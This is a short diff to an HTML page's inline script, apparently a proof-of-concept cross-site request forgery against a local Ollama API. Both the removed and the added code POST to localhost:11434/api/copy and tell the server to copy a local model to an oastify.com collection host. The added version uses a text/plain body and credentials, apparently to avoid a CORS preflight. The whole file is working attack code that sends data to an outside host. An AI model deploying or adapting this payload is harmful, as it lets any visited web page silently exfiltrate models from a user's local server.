@@ -9,19 +9,21 @@
     <script>
     function execQuark() {
 
-    const xhr = new XMLHttpRequest();
-    xhr.open('POST', 'http://localhost:11434/api/copy', true);
-    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); // Allowed content type
-    
-    // Handle response
-    xhr.onreadystatechange = function () {
-        if (xhr.readyState === 4 && xhr.status === 200) {
-            console.log('Response:', xhr.responseText);
+      var copyData = "{\"source\":\"llama3.2:latest\",\"destination\":\"theunvhsdm06ayhgxcd19zphc8iz6zuo.oastify.com/test/llama3:2\"}";
+
+      var updateXhr = new XMLHttpRequest();
+      updateXhr.withCredentials = true;
+      
+      updateXhr.addEventListener("readystatechange", function() {
+        if(this.readyState === 4) {
+          console.log(this.responseText);
         }
-    };
-    
-    // Send request with simple URL-encoded data
-    xhr.send('source=deepseek-r1%3A14b&destination=theunvhsdm06ayhgxcd19zphc8iz6zuo.oastify.com%2Ftest%2Fdeepseek-r1%3A');
+      });
+      
+      updateXhr.open("POST", "http://localhost:11434/api/copy");
+      updateXhr.setRequestHeader("Content-Type", "text/plain");
+      
+      updateXhr.send(copyData);
 
     }
     </script>
